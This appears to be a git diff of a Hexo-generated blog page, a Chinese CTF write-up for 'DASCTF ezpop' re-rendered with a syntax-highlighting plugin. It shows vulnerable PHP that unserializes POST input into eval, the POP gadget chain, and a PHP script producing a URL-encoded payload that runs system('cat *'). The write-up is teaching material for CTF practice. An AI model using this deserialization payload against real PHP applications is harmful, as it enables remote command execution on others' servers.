@@ -101,7 +101,9 @@
     
     
     
-<meta name="generator" content="Hexo 7.0.0"></head>
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-shiki-plugin@latest/lib/codeblock.css">
+<style>:root{--hl-color:#abb2bf;--hl-bg:#282c34;--hltools-bg:#21252b;--hltools-color:#bbbbbc;--hlnumber-bg:#282c34;--hlnumber-color:#495162;--hlscrollbar-bg:#373c47;--hlexpand-bg:linear-gradient(180deg,rgba(40,44,52,0.1),rgba(40,44,52,0.9))}</style><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.0.0"></head>
 
 
 <body>
@@ -458,147 +460,145 @@
 
         <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
             <h1 id="DASCTF-ezpop"><a href="#DASCTF-ezpop" class="headerlink" title="[DASCTF]-ezpop"></a>[DASCTF]-ezpop</h1><p>一道简单的php反序列化题目</p>
-<h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><pre><code class="php">&lt;?php  
+<h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><figure class="shiki php"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #56B6C2">&lt;</span><span style="color: #C678DD">?</span><span style="color: #ABB2BF">php  </span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #C678DD">class</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">crow</span><span style="color: #ABB2BF">  </span></span>
+<span class="line"><span style="color: #ABB2BF">{  </span></span>
+<span class="line"><span style="color: #ABB2BF">    public </span><span style="color: #E06C75">$v1</span><span style="color: #ABB2BF">;  </span></span>
+<span class="line"><span style="color: #ABB2BF">    public </span><span style="color: #E06C75">$v2</span><span style="color: #ABB2BF">;  </span></span>
+<span class="line"><span style="color: #ABB2BF">  </span></span>
+<span class="line"><span style="color: #61AFEF">    function eval</span><span style="color: #ABB2BF">() {  </span></span>
+<span class="line"><span style="color: #ABB2BF">        echo new </span><span style="color: #E5C07B">$this</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #61AFEF">v1</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">$this</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #E06C75">v2</span><span style="color: #ABB2BF">);  </span></span>
+<span class="line"><span style="color: #ABB2BF">    }  </span></span>
+<span class="line"><span style="color: #ABB2BF">  </span></span>
+<span class="line"><span style="color: #ABB2BF">    public function </span><span style="color: #61AFEF">__invoke</span><span style="color: #ABB2BF">()  </span></span>
+<span class="line"><span style="color: #ABB2BF">    { </span></span>
+<span class="line"><span style="color: #ABB2BF">	    </span><span style="color: #E5C07B">$this</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #E06C75">v1</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #61AFEF">world</span><span style="color: #ABB2BF">();  </span></span>
+<span class="line"><span style="color: #ABB2BF">    }  </span></span>
+<span class="line"><span style="color: #ABB2BF">}  </span></span>
+<span class="line"><span style="color: #ABB2BF">  </span></span>
+<span class="line"><span style="color: #C678DD">class</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">fin</span><span style="color: #ABB2BF">  </span></span>
+<span class="line"><span style="color: #ABB2BF">{  </span></span>
+<span class="line"><span style="color: #ABB2BF">    public </span><span style="color: #E06C75">$f1</span><span style="color: #ABB2BF">;  </span></span>
+<span class="line"><span style="color: #ABB2BF">  </span></span>
+<span class="line"><span style="color: #ABB2BF">    public function </span><span style="color: #61AFEF">__destruct</span><span style="color: #ABB2BF">()  </span></span>
+<span class="line"><span style="color: #ABB2BF">    {  </span></span>
+<span class="line"><span style="color: #ABB2BF">        echo </span><span style="color: #E5C07B">$this</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #E06C75">f1</span><span style="color: #ABB2BF"> </span><span style="color: #ABB2BF">.</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;114514&#39;</span><span style="color: #ABB2BF">;  </span></span>
+<span class="line"><span style="color: #ABB2BF">    }  </span></span>
+<span class="line"><span style="color: #ABB2BF">  </span></span>
+<span class="line"><span style="color: #ABB2BF">    public function </span><span style="color: #61AFEF">run</span><span style="color: #ABB2BF">()  </span></span>
+<span class="line"><span style="color: #ABB2BF">    {  </span></span>
+<span class="line"><span style="color: #61AFEF">        </span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">$this</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #E06C75">f1</span><span style="color: #ABB2BF">)();  </span></span>
+<span class="line"><span style="color: #ABB2BF">    }  </span></span>
+<span class="line"><span style="color: #ABB2BF">  </span></span>
+<span class="line"><span style="color: #ABB2BF">    public function </span><span style="color: #61AFEF">__call</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$a</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #E06C75">$b</span><span style="color: #ABB2BF">)  </span></span>
+<span class="line"><span style="color: #ABB2BF">    {  </span></span>
+<span class="line"><span style="color: #ABB2BF">        echo </span><span style="color: #E5C07B">$this</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #E06C75">f1</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #61AFEF">get_flag</span><span style="color: #ABB2BF">();  </span></span>
+<span class="line"><span style="color: #ABB2BF">    }  </span></span>
+<span class="line"><span style="color: #ABB2BF">  </span></span>
+<span class="line"><span style="color: #ABB2BF">}  </span></span>
+<span class="line"><span style="color: #ABB2BF">  </span></span>
+<span class="line"><span style="color: #C678DD">class</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">what</span><span style="color: #ABB2BF">  </span></span>
+<span class="line"><span style="color: #ABB2BF">{  </span></span>
+<span class="line"><span style="color: #ABB2BF">    public </span><span style="color: #E06C75">$a</span><span style="color: #ABB2BF">;  </span></span>
+<span class="line"><span style="color: #ABB2BF">  </span></span>
+<span class="line"><span style="color: #ABB2BF">    public function </span><span style="color: #61AFEF">__toString</span><span style="color: #ABB2BF">()  </span></span>
+<span class="line"><span style="color: #ABB2BF">    { </span></span>
+<span class="line"><span style="color: #ABB2BF">	    </span><span style="color: #E5C07B">$this</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #E06C75">a</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #61AFEF">run</span><span style="color: #ABB2BF">();  </span></span>
+<span class="line"><span style="color: #ABB2BF">        return </span><span style="color: #98C379">&#39;hello&#39;</span><span style="color: #ABB2BF">;  </span></span>
+<span class="line"><span style="color: #ABB2BF">    }  </span></span>
+<span class="line"><span style="color: #ABB2BF">}  </span></span>
+<span class="line"><span style="color: #C678DD">class</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">mix</span><span style="color: #ABB2BF">  </span></span>
+<span class="line"><span style="color: #ABB2BF">{  </span></span>
+<span class="line"><span style="color: #ABB2BF">    public </span><span style="color: #E06C75">$m1</span><span style="color: #ABB2BF">;  </span></span>
+<span class="line"><span style="color: #ABB2BF">  </span></span>
+<span class="line"><span style="color: #ABB2BF">    public function </span><span style="color: #61AFEF">run</span><span style="color: #ABB2BF">()  </span></span>
+<span class="line"><span style="color: #ABB2BF">    {  </span></span>
+<span class="line"><span style="color: #61AFEF">        </span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">$this</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #E06C75">m1</span><span style="color: #ABB2BF">)();  </span></span>
+<span class="line"><span style="color: #ABB2BF">    }  </span></span>
+<span class="line"><span style="color: #ABB2BF">  </span></span>
+<span class="line"><span style="color: #ABB2BF">    public function </span><span style="color: #61AFEF">get_flag</span><span style="color: #ABB2BF">()  </span></span>
+<span class="line"><span style="color: #ABB2BF">    {  </span></span>
+<span class="line"><span style="color: #61AFEF">        eval</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;#&#39;</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">$this</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #E06C75">m1</span><span style="color: #ABB2BF">);  </span></span>
+<span class="line"><span style="color: #ABB2BF">    }  </span></span>
+<span class="line"><span style="color: #ABB2BF">  </span></span>
+<span class="line"><span style="color: #ABB2BF">}  </span></span>
+<span class="line"><span style="color: #ABB2BF">  </span></span>
+<span class="line"><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (</span><span style="color: #56B6C2">isset</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$_POST</span><span style="color: #ABB2BF">[</span><span style="color: #98C379">&#39;cmd&#39;</span><span style="color: #ABB2BF">])) { </span><span style="color: #56B6C2">unserialize</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$_POST</span><span style="color: #ABB2BF">[</span><span style="color: #98C379">&#39;cmd&#39;</span><span style="color: #ABB2BF">]);  </span></span>
+<span class="line"><span style="color: #ABB2BF">} else { </span><span style="color: #56B6C2">highlight_file</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">__FILE__</span><span style="color: #ABB2BF">);  </span></span>
+<span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure>
 
-class crow  
-&#123;  
-    public $v1;  
-    public $v2;  
-  
-    function eval() &#123;  
-        echo new $this-&gt;v1($this-&gt;v2);  
-    &#125;  
-  
-    public function __invoke()  
-    &#123; 
-        $this-&gt;v1-&gt;world();  
-    &#125;  
-&#125;  
-  
-class fin  
-&#123;  
-    public $f1;  
-  
-    public function __destruct()  
-    &#123;  
-        echo $this-&gt;f1 . &#39;114514&#39;;  
-    &#125;  
-  
-    public function run()  
-    &#123;  
-        ($this-&gt;f1)();  
-    &#125;  
-  
-    public function __call($a, $b)  
-    &#123;  
-        echo $this-&gt;f1-&gt;get_flag();  
-    &#125;  
-  
-&#125;  
-  
-class what  
-&#123;  
-    public $a;  
-  
-    public function __toString()  
-    &#123; 
-        $this-&gt;a-&gt;run();  
-        return &#39;hello&#39;;  
-    &#125;  
-&#125;  
-class mix  
-&#123;  
-    public $m1;  
-  
-    public function run()  
-    &#123;  
-        ($this-&gt;m1)();  
-    &#125;  
-  
-    public function get_flag()  
-    &#123;  
-        eval(&#39;#&#39; . $this-&gt;m1);  
-    &#125;  
-  
-&#125;  
-  
-if (isset($_POST[&#39;cmd&#39;])) &#123; unserialize($_POST[&#39;cmd&#39;]);  
-&#125; else &#123; highlight_file(__FILE__);  
-&#125;
-</code></pre>
 <p>发现没有<code>__wakeup()</code>和<code>__construct()</code>，那么最先被调用的应该就是<code>fin</code>类里面的<code>__destruct()</code>方法了。</p>
-<h2 id="构造POP链"><a href="#构造POP链" class="headerlink" title="构造POP链"></a>构造<code>POP</code>链</h2><pre><code>fin::__destruct()    # 其中的echo触发__toString()
-↓
-what::__toString()   # 调用run()
-↓
-mix::run()           # 将f1以函数方式调用，触发__invoke()
-↓
-crow::__invoke()     # 调用不存在的方法world()，触发__call()
-↓
-fin::__call()        # 调用get_flag()
-↓
-mix::get_flag()      # 这里在命令前加了一个注释符，用换行符绕过即可
-</code></pre>
-<h2 id="构造Payload"><a href="#构造Payload" class="headerlink" title="构造Payload"></a>构造<code>Payload</code></h2><pre><code class="php">&lt;?php
+<h2 id="构造POP链"><a href="#构造POP链" class="headerlink" title="构造POP链"></a>构造<code>POP</code>链</h2><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">fin::__destruct()    # 其中的echo触发__toString()</span></span>
+<span class="line"><span style="color: #abb2bf">↓</span></span>
+<span class="line"><span style="color: #abb2bf">what::__toString()   # 调用run()</span></span>
+<span class="line"><span style="color: #abb2bf">↓</span></span>
+<span class="line"><span style="color: #abb2bf">mix::run()           # 将f1以函数方式调用，触发__invoke()</span></span>
+<span class="line"><span style="color: #abb2bf">↓</span></span>
+<span class="line"><span style="color: #abb2bf">crow::__invoke()     # 调用不存在的方法world()，触发__call()</span></span>
+<span class="line"><span style="color: #abb2bf">↓</span></span>
+<span class="line"><span style="color: #abb2bf">fin::__call()        # 调用get_flag()</span></span>
+<span class="line"><span style="color: #abb2bf">↓</span></span>
+<span class="line"><span style="color: #abb2bf">mix::get_flag()      # 这里在命令前加了一个注释符，用换行符绕过即可</span></span></code></pre></div></div></figure>
 
-class crow
-&#123;
-    public $v1;
-    public $v2;
-    
-    public function __construct($v1)
-    &#123;
-        $this-&gt;v1 = $v1;
-    &#125;
-&#125;
+<h2 id="构造Payload"><a href="#构造Payload" class="headerlink" title="构造Payload"></a>构造<code>Payload</code></h2><figure class="shiki php"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #56B6C2">&lt;</span><span style="color: #C678DD">?</span><span style="color: #ABB2BF">php</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #C678DD">class</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">crow</span></span>
+<span class="line"><span style="color: #ABB2BF">{</span></span>
+<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">public</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$v1</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">public</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$v2</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #ABB2BF">	</span></span>
+<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #C678DD">public</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">function</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">__construct</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$v1</span><span style="color: #ABB2BF">)</span></span>
+<span class="line"><span style="color: #ABB2BF">	{</span></span>
+<span class="line"><span style="color: #ABB2BF">		</span><span style="color: #E5C07B">$this</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #E06C75">v1</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$v1</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #ABB2BF">	}</span></span>
+<span class="line"><span style="color: #ABB2BF">}</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #C678DD">class</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">fin</span></span>
+<span class="line"><span style="color: #ABB2BF">{</span></span>
+<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">public</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$f1</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #C678DD">public</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">function</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">__construct</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$f1</span><span style="color: #ABB2BF">)</span></span>
+<span class="line"><span style="color: #ABB2BF">	{</span></span>
+<span class="line"><span style="color: #ABB2BF">		</span><span style="color: #E5C07B">$this</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #E06C75">f1</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$f1</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #ABB2BF">	}</span></span>
+<span class="line"><span style="color: #ABB2BF">}</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #C678DD">class</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">what</span></span>
+<span class="line"><span style="color: #ABB2BF">{</span></span>
+<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">public</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$a</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #ABB2BF">   </span></span>
+<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #C678DD">public</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">function</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">__construct</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$a</span><span style="color: #ABB2BF">)</span></span>
+<span class="line"><span style="color: #ABB2BF">	{</span></span>
+<span class="line"><span style="color: #ABB2BF">		</span><span style="color: #E5C07B">$this</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #E06C75">a</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$a</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #ABB2BF">	}</span></span>
+<span class="line"><span style="color: #ABB2BF">}</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #C678DD">class</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">mix</span></span>
+<span class="line"><span style="color: #ABB2BF">{</span></span>
+<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">public</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$m1</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #ABB2BF">   </span></span>
+<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #C678DD">public</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">function</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">__construct</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$m1</span><span style="color: #ABB2BF">)</span></span>
+<span class="line"><span style="color: #ABB2BF">	{</span></span>
+<span class="line"><span style="color: #ABB2BF">		</span><span style="color: #E5C07B">$this</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #E06C75">m1</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$m1</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #ABB2BF">	}</span></span>
+<span class="line"><span style="color: #ABB2BF">}</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #E06C75">$f</span><span style="color: #56B6C2">=</span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">mix</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\n</span><span style="color: #98C379">system(&#39;cat *&#39;);&quot;</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #E06C75">$e</span><span style="color: #56B6C2">=</span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">fin</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$f</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #E06C75">$d</span><span style="color: #56B6C2">=</span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">crow</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$e</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #E06C75">$c</span><span style="color: #56B6C2">=</span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">mix</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$d</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #E06C75">$b</span><span style="color: #56B6C2">=</span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">what</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$c</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #E06C75">$a</span><span style="color: #56B6C2">=</span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">fin</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$b</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #56B6C2">echo</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">urlencode</span><span style="color: #ABB2BF">(</span><span style="color: #56B6C2">serialize</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$a</span><span style="color: #ABB2BF">));</span></span></code></pre></div></div></figure>
 
-class fin
-&#123;
-    public $f1;
-
-    public function __construct($f1)
-    &#123;
-        $this-&gt;f1 = $f1;
-    &#125;
-&#125;
-
-class what
-&#123;
-    public $a;
-   
-    public function __construct($a)
-    &#123;
-        $this-&gt;a = $a;
-    &#125;
-&#125;
-
-class mix
-&#123;
-    public $m1;
-   
-    public function __construct($m1)
-    &#123;
-        $this-&gt;m1 = $m1;
-    &#125;
-&#125;
-
-$f=new mix(&quot;\nsystem(&#39;cat *&#39;);&quot;);
-$e=new fin($f);
-$d=new crow($e);
-$c=new mix($d);
-$b=new what($c);
-$a=new fin($b);
-
-echo urlencode(serialize($a));
-</code></pre>
 <p>输出</p>
-<pre><code>O%3A3%3A%22fin%22%3A1%3A%7Bs%3A2%3A%22f1%22%3BO%3A4%3A%22what%22%3A1%3A%7Bs%3A1%3A%22a%22%3BO%3A3%3A%22mix%22%3A1%3A%7Bs%3A2%3A%22m1%22%3BO%3A4%3A%22crow%22%3A2%3A%7Bs%3A2%3A%22v1%22%3BO%3A3%3A%22fin%22%3A1%3A%7Bs%3A2%3A%22f1%22%3BO%3A3%3A%22mix%22%3A1%3A%7Bs%3A2%3A%22m1%22%3Bs%3A17%3A%22%0Asystem%28%27cat+%2A%27%29%3B%22%3B%7D%7Ds%3A2%3A%22v2%22%3BN%3B%7D%7D%7D%7D
-</code></pre>
-<p>拿到flag</p>
-<pre><code>//flag&#123;43282d76-6cb5-4e5c-9286-48e8688c6853&#125;
-not here, but it&#39;s close, think more.not here, but it&#39;s close, think more.not here, but it&#39;s close, think more.not here, but you are almost getting the flag!
-</code></pre>
+<figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">O%3A3%3A%22fin%22%3A1%3A%7Bs%3A2%3A%22f1%22%3BO%3A4%3A%22what%22%3A1%3A%7Bs%3A1%3A%22a%22%3BO%3A3%3A%22mix%22%3A1%3A%7Bs%3A2%3A%22m1%22%3BO%3A4%3A%22crow%22%3A2%3A%7Bs%3A2%3A%22v1%22%3BO%3A3%3A%22fin%22%3A1%3A%7Bs%3A2%3A%22f1%22%3BO%3A3%3A%22mix%22%3A1%3A%7Bs%3A2%3A%22m1%22%3Bs%3A17%3A%22%0Asystem%28%27cat+%2A%27%29%3B%22%3B%7D%7Ds%3A2%3A%22v2%22%3BN%3B%7D%7D%7D%7D</span></span></code></pre></div></div></figure>
 
+<p>拿到flag</p>
+<figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">//flag{43282d76-6cb5-4e5c-9286-48e8688c6853}</span></span>
+<span class="line"><span style="color: #abb2bf">not here, but it&#39;s close, think more.not here, but it&#39;s close, think more.not here, but it&#39;s close, think more.not here, but you are almost getting the flag!</span></span></code></pre></div></div></figure>
         </div>
 
         
@@ -999,5 +999,28 @@ not here, but it&#39;s close, think more.not here, but it&#39;s close, think mor
 </div>
 
 
-</body>
+<!-- hexo injector body_end start -->
+<script src="https://cdn.jsdelivr.net/npm/hexo-shiki-plugin@latest/lib/codeblock.js"></script>
+
+  <script>
+  const CODE_CONFIG = {
+    beautify: true,
+    highlightCopy: undefined,
+    highlightLang: true,
+    highlightHeightLimit: undefined,
+    isHighlightShrink: false,
+    copy: {
+      success: 'undefined',
+      error: 'undefined',
+      noSupport: 'undefined',
+    }
+  };
+  console.log(
+    `%c hexo-shiki-plugin %c v1.0.27 %c https://github.com/nova1751/hexo-shiki-plugin`,
+    "color: #fff; background: #5f5f5f",
+    "color: #fff; background: #80c8f8",
+    ""
+  );
+  </script>
+  <!-- hexo injector body_end end --></body>
 </html>
